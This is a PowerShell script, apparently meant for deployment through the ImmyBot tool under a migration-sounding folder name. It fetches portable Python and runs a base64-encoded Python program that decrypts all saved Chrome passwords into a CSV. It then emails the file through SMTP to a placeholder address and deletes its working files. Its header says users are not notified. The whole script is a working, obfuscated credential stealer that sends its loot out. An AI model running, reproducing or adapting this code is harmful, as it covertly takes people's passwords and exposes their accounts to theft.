# This script is making use of https://github.com/ohyicong/decrypt-chrome-passwords
# to gather all chrome passwords from file and decrypts them, once decrypted they
# can be send using an SMTP server information to any email. This can be perfectly
#run in background mode and user won't be notified, tested with Immybot 0.53.10

Write-Host "[+] Script start"
$WorkPath = "C:\Windows\Temp\Keepermigration"
$PythonPathUser = "$($env:USERPROFILE)\AppData\Local\Programs\Python\Python310\python.exe"
$PythonPathSystem = "C:\Program Files\Python310\python.exe"

$PythonUri = 'https://cfhcable.dl.sourceforge.net/project/portable-python/Portable%20Python%203.10/Portable%20Python-3.10.5%20x64.exe' #7zSFX


if (Test-Path $WorkPath) {
    Write-Host "[!] Previous working directory exists, deleting..."
    Remove-Item $WorkPath -Recurse -Force -EA SilentlyContinue
    Start-Sleep -Seconds 2
 }
Write-Host "[+] Creating working directory"
New-Item $WorkPath -ItemType Directory -Force | Out-Null
Set-Location $WorkPath

#$url = "https://www.python.org/ftp/python/3.10.7/python-3.10.7-amd64.exe"
#$output = "$WorkPath\python-3.10.7-amd64.exe"

if (Test-Path $PythonPathUser) {
    Write-Host "[+] Python installed, skipping installation"
    $PythonPath = $PythonPathUser
}
elseif (Test-Path $PythonPathSystem) {
    Write-Host "[+] Python installed, skipping installation"
    $PythonPath = $PythonPathSystem
}
else {
    Write-Host "[!] Python not installed, downloading portable"
    #Invoke-WebRequest -Uri $PythonUri -OutFile "$WorkPath\Python3105.zip"
    Invoke-WebRequest -Uri $PythonUri -OutFile "$WorkPath\python.exe"
    #Expand-Archive -Path Python3105.zip -Destination $WorkPath
    Write-Host "[!] Portable downloaded, extracting archive"
    Start-Process "$WorkPath\python.exe" -WindowStyle Hidden -ArgumentList -o".\Python",-y -Wait
    #$PythonPath = "$WorkPath\Python3510\App\Python\python.exe"
    $PythonPath = "$WorkPath\Python\Portable Python-3.10.5 x64\App\Python\python.exe"
    <#
    Write-Host "[!] Python not installed, starting installation"
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $url -OutFile $output
    Start-Process $output -ArgumentList /passive,InstallAllUsers=1,PrependPath=1,Include_test=0 -NoNewWindow -Wait
    Write-Host "[+] Python installed, continuing..."
    $PythonPath = $PythonPathSystem
    Start-Sleep -Seconds 5
    #>
}
Write-Host "[+] Python path set to $PythonPath"
Write-Host "[+] Creating decryptor script"
#From https://github.com/ohyicong/decrypt-chrome-passwords
$EncodedText = 'aW1wb3J0IG9zDQppbXBvcnQgcmUNCmltcG9ydCBzeXMNCmltcG9ydCBqc29uDQppbXBvcnQgYmFzZTY0DQppbXBvcnQgc3FsaXRlMw0KaW1wb3J0IHdpbjMyY3J5cHQNCmZyb20gQ3J5cHRvZG9tZS5DaXBoZXIgaW1wb3J0IEFFUw0KaW1wb3J0IHNodXRpbA0KaW1wb3J0IGNzdg0KDQojR0xPQkFMIENPTlNUQU5UDQpDSFJPTUVfUEFUSF9MT0NBTF9TVEFURSA9IG9zLnBhdGgubm9ybXBhdGgociIlc1xBcHBEYXRhXExvY2FsXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXExvY2FsIFN0YXRlIiUob3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXSkpDQpDSFJPTUVfUEFUSCA9IG9zLnBhdGgubm9ybXBhdGgociIlc1xBcHBEYXRhXExvY2FsXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhIiUob3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXSkpDQoNCmRlZiBnZXRfc2VjcmV0X2tleSgpOg0KICAgIHRyeToNCiAgICAgICAgIygxKSBHZXQgc2VjcmV0a2V5IGZyb20gY2hyb21lIGxvY2FsIHN0YXRlDQogICAgICAgIHdpdGggb3BlbiggQ0hST01FX1BBVEhfTE9DQUxfU1RBVEUsICJyIiwgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjoNCiAgICAgICAgICAgIGxvY2FsX3N0YXRlID0gZi5yZWFkKCkNCiAgICAgICAgICAgIGxvY2FsX3N0YXRlID0ganNvbi5sb2Fkcyhsb2NhbF9zdGF0ZSkNCiAgICAgICAgc2VjcmV0X2tleSA9IGJhc2U2NC5iNjRkZWNvZGUobG9jYWxfc3RhdGVbIm9zX2NyeXB0Il1bImVuY3J5cHRlZF9rZXkiXSkNCiAgICAgICAgI1JlbW92ZSBzdWZmaXggRFBBUEkNCiAgICAgICAgc2VjcmV0X2tleSA9IHNlY3JldF9rZXlbNTpdIA0KICAgICAgICBzZWNyZXRfa2V5ID0gd2luMzJjcnlwdC5DcnlwdFVucHJvdGVjdERhdGEoc2VjcmV0X2tleSwgTm9uZSwgTm9uZSwgTm9uZSwgMClbMV0NCiAgICAgICAgcmV0dXJuIHNlY3JldF9rZXkNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHByaW50KCIlcyIlc3RyKGUpKQ0KICAgICAgICBwcmludCgiW0VSUl0gQ2hyb21lIHNlY3JldGtleSBjYW5ub3QgYmUgZm91bmQiKQ0KICAgICAgICByZXR1cm4gTm9uZQ0KICAgIA0KZGVmIGRlY3J5cHRfcGF5bG9hZChjaXBoZXIsIHBheWxvYWQpOg0KICAgIHJldHVybiBjaXBoZXIuZGVjcnlwdChwYXlsb2FkKQ0KDQpkZWYgZ2VuZXJhdGVfY2lwaGVyKGFlc19rZXksIGl2KToNCiAgICByZXR1cm4gQUVTLm5ldyhhZXNfa2V5LCBBRVMuTU9ERV9HQ00sIGl2KQ0KDQpkZWYgZGVjcnlwdF9wYXNzd29yZChjaXBoZXJ0ZXh0LCBzZWNyZXRfa2V5KToNCiAgICB0cnk6DQogICAgICAgICMoMy1hKSBJbml0aWFsaXNhdGlvbiB2ZWN0b3IgZm9yIEFFUyBkZWNyeXB0aW9uDQogICAgICAgIGluaXRpYWxpc2F0aW9uX3ZlY3RvciA9IGNpcGhlcnRleHRbMzoxNV0NCiAgICAgICAgIygzLWIpIEdldCBlbmNyeXB0ZWQgcGFzc3dvcmQgYnkgcmVtb3Zpbmcgc3VmZml4IGJ5dGVzIChsYXN0IDE2IGJpdHMpDQogICAgICAgICNFbmNyeXB0ZWQgcGFzc3dvcmQgaXMgMTkyIGJpdHMNCiAgICAgICAgZW5jcnlwdGVkX3Bhc3N3b3JkID0gY2lwaGVydGV4dFsxNTotMTZdDQogICAgICAgICMoNCkgQnVpbGQgdGhlIGNpcGhlciB0byBkZWNyeXB0IHRoZSBjaXBoZXJ0ZXh0DQogICAgICAgIGNpcGhlciA9IGdlbmVyYXRlX2NpcGhlcihzZWNyZXRfa2V5LCBpbml0aWFsaXNhdGlvbl92ZWN0b3IpDQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdF9wYXlsb2FkKGNpcGhlciwgZW5jcnlwdGVkX3Bhc3N3b3JkKQ0KICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGRlY3J5cHRlZF9wYXNzLmRlY29kZSgpICANCiAgICAgICAgcmV0dXJuIGRlY3J5cHRlZF9wYXNzDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBwcmludCgiJXMiJXN0cihlKSkNCiAgICAgICAgcHJpbnQoIltFUlJdIFVuYWJsZSB0byBkZWNyeXB0LCBDaHJvbWUgdmVyc2lvbiA8ODAgbm90IHN1cHBvcnRlZC4gUGxlYXNlIGNoZWNrLiIpDQogICAgICAgIHJldHVybiAiIg0KICAgIA0KZGVmIGdldF9kYl9jb25uZWN0aW9uKGNocm9tZV9wYXRoX2xvZ2luX2RiKToNCiAgICB0cnk6DQogICAgICAgIHByaW50KGNocm9tZV9wYXRoX2xvZ2luX2RiKQ0KICAgICAgICBzaHV0aWwuY29weTIoY2hyb21lX3BhdGhfbG9naW5fZGIsICJMb2dpbnZhdWx0LmRiIikgDQogICAgICAgIHJldHVybiBzcWxpdGUzLmNvbm5lY3QoIkxvZ2ludmF1bHQuZGIiKQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgcHJpbnQoIiVzIiVzdHIoZSkpDQogICAgICAgIHByaW50KCJbRVJSXSBDaHJvbWUgZGF0YWJhc2UgY2Fubm90IGJlIGZvdW5kIikNCiAgICAgICAgcmV0dXJuIE5vbmUNCiAgICAgICAgDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KICAgIHRyeToNCiAgICAgICAgI0NyZWF0ZSBEYXRhZnJhbWUgdG8gc3RvcmUgcGFzc3dvcmRzDQogICAgICAgIHdpdGggb3BlbignZGVjcnlwdGVkX3Bhc3N3b3JkLmNzdicsIG1vZGU9J3cnLCBuZXdsaW5lPScnLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBkZWNyeXB0X3Bhc3N3b3JkX2ZpbGU6DQogICAgICAgICAgICBjc3Zfd3JpdGVyID0gY3N2LndyaXRlcihkZWNyeXB0X3Bhc3N3b3JkX2ZpbGUsIGRlbGltaXRlcj0nLCcpDQogICAgICAgICAgICBjc3Zfd3JpdGVyLndyaXRlcm93KFsiaW5kZXgiLCJ1cmwiLCJ1c2VybmFtZSIsInBhc3N3b3JkIl0pDQogICAgICAgICAgICAjKDEpIEdldCBzZWNyZXQga2V5DQogICAgICAgICAgICBzZWNyZXRfa2V5ID0gZ2V0X3NlY3JldF9rZXkoKQ0KICAgICAgICAgICAgI1NlYXJjaCB1c2VyIHByb2ZpbGUgb3IgZGVmYXVsdCBmb2xkZXIgKHRoaXMgaXMgd2hlcmUgdGhlIGVuY3J5cHRlZCBsb2dpbiBwYXNzd29yZCBpcyBzdG9yZWQpDQogICAgICAgICAgICBmb2xkZXJzID0gW2VsZW1lbnQgZm9yIGVsZW1lbnQgaW4gb3MubGlzdGRpcihDSFJPTUVfUEFUSCkgaWYgcmUuc2VhcmNoKCJeUHJvZmlsZSp8XkRlZmF1bHQkIixlbGVtZW50KSE9Tm9uZV0NCiAgICAgICAgICAgIGZvciBmb2xkZXIgaW4gZm9sZGVyczoNCiAgICAgICAgICAgIAkjKDIpIEdldCBjaXBoZXJ0ZXh0IGZyb20gc3FsaXRlIGRhdGFiYXNlDQogICAgICAgICAgICAgICAgY2hyb21lX3BhdGhfbG9naW5fZGIgPSBvcy5wYXRoLm5vcm1wYXRoKHIiJXNcJXNcTG9naW4gRGF0YSIlKENIUk9NRV9QQVRILGZvbGRlcikpDQogICAgICAgICAgICAgICAgY29ubiA9IGdldF9kYl9jb25uZWN0aW9uKGNocm9tZV9wYXRoX2xvZ2luX2RiKQ0KICAgICAgICAgICAgICAgIGlmKHNlY3JldF9rZXkgYW5kIGNvbm4pOg0KICAgICAgICAgICAgICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpDQogICAgICAgICAgICAgICAgICAgIGN1cnNvci5leGVjdXRlKCJTRUxFQ1QgYWN0aW9uX3VybCwgdXNlcm5hbWVfdmFsdWUsIHBhc3N3b3JkX3ZhbHVlIEZST00gbG9naW5zIikNCiAgICAgICAgICAgICAgICAgICAgZm9yIGluZGV4LGxvZ2luIGluIGVudW1lcmF0ZShjdXJzb3IuZmV0Y2hhbGwoKSk6DQogICAgICAgICAgICAgICAgICAgICAgICB1cmwgPSBsb2dpblswXQ0KICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWUgPSBsb2dpblsxXQ0KICAgICAgICAgICAgICAgICAgICAgICAgY2lwaGVydGV4dCA9IGxvZ2luWzJdDQogICAgICAgICAgICAgICAgICAgICAgICBpZih1cmwhPSIiIG9yIHVzZXJuYW1lIT0iIiBvciBjaXBoZXJ0ZXh0IT0iIik6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIygzKSBGaWx0ZXIgdGhlIGluaXRpYWxpc2F0aW9uIHZlY3RvciAmIGVuY3J5cHRlZCBwYXNzd29yZCBmcm9tIGNpcGhlcnRleHQgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyg0KSBVc2UgQUVTIGFsZ29yaXRobSB0byBkZWNyeXB0IHRoZSBwYXNzd29yZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlY3J5cHRlZF9wYXNzd29yZCA9IGRlY3J5cHRfcGFzc3dvcmQoY2lwaGVydGV4dCwgc2VjcmV0X2tleSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiU2VxdWVuY2U6ICVkIiUoaW5kZXgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJVUkw6ICVzXG5Vc2VyIE5hbWU6ICVzXG5QYXNzd29yZDogJXNcbiIlKHVybCx1c2VybmFtZSxkZWNyeXB0ZWRfcGFzc3dvcmQpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCIqIio1MCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjKDUpIFNhdmUgaW50byBDU1YgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3N2X3dyaXRlci53cml0ZXJvdyhbaW5kZXgsdXJsLHVzZXJuYW1lLGRlY3J5cHRlZF9wYXNzd29yZF0pDQogICAgICAgICAgICAgICAgICAgICNDbG9zZSBkYXRhYmFzZSBjb25uZWN0aW9uDQogICAgICAgICAgICAgICAgICAgIGN1cnNvci5jbG9zZSgpDQogICAgICAgICAgICAgICAgICAgIGNvbm4uY2xvc2UoKQ0KICAgICAgICAgICAgICAgICAgICAjRGVsZXRlIHRlbXAgbG9naW4gZGINCiAgICAgICAgICAgICAgICAgICAgb3MucmVtb3ZlKCJMb2dpbnZhdWx0LmRiIikNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHByaW50KCJbRVJSXSAiJXN0cihlKSkNCiAgICAgICAgDQogICAgICAgIA=='
$DecodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedText))
$DecodedText | Set-Content decrypt_chrome_password.py -Encoding UTF8

Write-Host "[+] Checking dependencies"
$PythonRun = "& '$PythonPath' -m pip install pypiwin32 pycryptodomex"
Invoke-Expression "$PythonRun"
$PythonRun = "& '$PythonPath' decrypt_chrome_password.py"
Write-Host "[+] Running script..."
Invoke-Expression "$PythonRun"
Start-Sleep 4
Write-Host "[+] Script finished, removing..."
Remove-Item decrypt_chrome_password.py -Force

Write-Host "[+] Decrypted passwords obtained:"
Get-ChildItem $WorkPath\decrypted_password.csv

Write-Host "[+] Preparing email"
$User = "<SMTP EMAIL>"
$Password = "<SMTP PASSWORD>"
$Password | Set-Content Password.txt
$File = "Password.txt"
$cred=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, (Get-Content $File | ConvertTo-SecureString -AsPlainText -Force)
Remove-Item Password.txt -Force
#$EmailTo = "<DESTINATION EMAIL>"
$EmailTo = "<DESTINATION EMAIL>"
$EmailFrom = "<SMTP EMAIL>"
$date = Get-Date -Format g
$Subject = "Chrome Info $($env:ComputerName) - $date"
$Body = "User: $($env:UserName)`nComputer: $($env:ComputerName)"
$SMTPServer = “<SMTP SERVER FQDN>"
Write-Host "[+] Attaching password file"
$filenameAndPath = "$WorkPath\decrypted_password.csv"
$SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)
$attachment = New-Object System.Net.Mail.Attachment($filenameAndPath)
$SMTPMessage.Attachments.Add($attachment)
$SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, 587)
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($cred.UserName, $cred.Password);
Write-Host "[+] Sending email..."
$SMTPClient.Send($SMTPMessage)
Start-Sleep -Seconds 13
$SMTPClient.Dispose()
$attachment.Dispose()
$SMTPMessage.Dispose()
Start-Sleep -Seconds 2
Write-Host "[+] Script finished. Deleting working folder"
Set-Location "C:\Windows\Temp"
Remove-Item -Path "$WorkPath\decrypted_password.csv" -Force
Remove-Item -Path $WorkPath -Recurse -Force -EA SilentlyContinue
Start-Sleep -Seconds 2
